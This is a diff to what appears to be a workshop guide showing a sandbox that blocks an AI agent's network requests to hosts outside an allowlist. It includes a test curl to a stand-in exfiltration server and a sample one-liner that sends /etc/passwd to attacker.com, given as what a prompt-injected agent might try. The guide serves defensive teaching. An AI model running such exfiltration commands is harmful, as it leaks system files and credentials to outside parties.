@@ -148,7 +148,14 @@ Simulate what a compromised agent might try — sending data to an attacker's se
 curl -v --max-time 5 https://evil-exfil-server.com/upload 2>&1 | tail -3
 ```
 
-Expected: `Permission denied` — the request never leaves the sandbox.
+Expected:
+
+```
+* Closing connection
+curl: (7) Failed to connect to evil-exfil-server.com port 443 after 2 ms: Couldn't connect to server
+```
+
+❌ **Denied** — same instant rejection. The exfiltration attempt never leaves the sandbox.
 
 > **What would happen in a real attack?** If an attacker compromised the AI agent (e.g., via prompt injection), they might try to `curl https://attacker.com/steal?data=$(cat /etc/passwd)`. With OpenShell, this fails immediately — `attacker.com` isn't in the allowlist. The data never leaves.
 
@@ -164,9 +171,9 @@ exit
 |------|--------|----------|--------|
 | MAAS API | `maas-rhdp.apps.maas.redhatworkshops.io` | HTTP 200 (with auth) | ✅ Allowed — endpoint in policy |
 | GitHub | `github.com` | HTTP 200 | ✅ Allowed — endpoint in policy |
-| Google | `www.google.com` | Permission denied | ❌ Denied — not in policy |
-| Example.com | `example.com` | Permission denied | ❌ Denied — not in policy |
-| Exfil Server | `evil-exfil-server.com` | Permission denied | ❌ Denied — not in policy |
+| Google | `www.google.com` | Connection refused (~2ms) | ❌ Denied — not in policy |
+| Example.com | `example.com` | Connection refused (~2ms) | ❌ Denied — not in policy |
+| Exfil Server | `evil-exfil-server.com` | Connection refused (~2ms) | ❌ Denied — not in policy |
 
 ## Why This Matters
 
